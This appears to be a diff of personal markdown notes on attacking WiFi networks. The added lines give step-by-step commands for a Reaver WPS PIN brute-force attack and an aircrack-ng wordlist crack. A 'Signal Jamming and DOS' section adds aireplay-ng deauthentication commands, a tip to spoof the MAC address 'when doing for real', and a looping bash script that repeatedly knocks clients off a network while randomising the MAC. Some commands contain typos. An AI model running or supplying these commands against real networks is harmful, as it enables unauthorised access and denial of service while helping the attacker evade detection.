@@ -5,7 +5,7 @@ from this https://ubuntuforums.org/showthread.php?t=528276
 ##### change wifi card from promiscuous to monitor mode.  
 1. `ifconfig`  
 2. `ifconfig wlan0 down`  
-3. `iwconfig wlan0 mode monitor`  
+3. `iwconfig wlan0 mode monitor|manage`  
 4. `ifconfig wlan0 up`  
 ##### check airmon-ng is good to go
 1. `airmon-ng check wlan0`  
@@ -64,6 +64,57 @@ Aircrack-PTW:
 12. `crunch 10 10 -t @@@@@@@@@@ | aircrack-ng -w - SCAN_test-01.cap -e <essid>`  
 ##### try using a list cd crunch-3.6 find charset.lst 
 13. `crunch 10 10 -t @@@@@@@@@@ -f charset.lst mixalpha-numeric-space`  
+14. `aircrack-ng -w /root/nmap.lst SCAN_test-01.cap`  
 
-# REAVER 
+# REAVER v1.5.2 WiFi Protected Setup Attack Tool
+`reaver --help`  
+1. `ifconfig`  
+2. `ifconfig wlan0 down`  
+3. `iwconfig wlan0 mode monitor`  
+4. `ifconfig wlan0 up`  
+##### check airmon-ng is good to go
+5. `airmon-ng check wlan0`  
+6. kill processes that are running.  `kill NetworkManager` 
+##### use wash to check if wps is locked
+7. `wash -i wlan0mon`  or `wash -i wlan0mon --ignore-fcs`  
+8. check PWR is above -60  
+9. `airodump-ng wlan0mon`  
+10. `reaver -b mac-address-of-router -i wlan0mon -c 1 -vv` 
+##### you may need to self associate using aireplay-ng 
+11. `aireplay-ng -1 0 wlan0mon -a <bssid>`  
+12 . `reaver -i wlan0mon -b <bssid> -c 1 -A -vv`  
+13. `reaver -i wlanmon -b <bssid> -c 1 -r 2:60`  
+
+# Signal Jamming and DOS 
+1. put network card into monitor mode
+2. `airmon-ng check wlan0`
+*note* when doing for real change mac address of wireless interface  
+`ifconfig wlan0 down`
+`macchanger -A wlan0`  
+`ifconfig wlan0 up`
+3. `airodump-ng wlan0` 
+4. `aireplay-ng -0 0 -a <bssid> wlan0`  or and (-c <clients's mac>) as to not knock everyone off network.  
+if you have to configure channel  
+5. `iwconfig wlan0 channel <num>`  
+
+#### write jam script
+```
+#!/bin/bash 
+while true
+do 
+    aireplay-ng -0 5 -a <bssid> wlan0
+    ifconfig wlan0 down
+    macchanger -r wlan0 | grep "New MAC"
+    iwconfig wlan0 mode monitor 
+    ifconfig wlan0 up
+    iwcofngi wlan0 | grep Mode
+    sleep 3
+    echo "Waiting!!!!!"
+done
+```
+
+
+
+
+
 
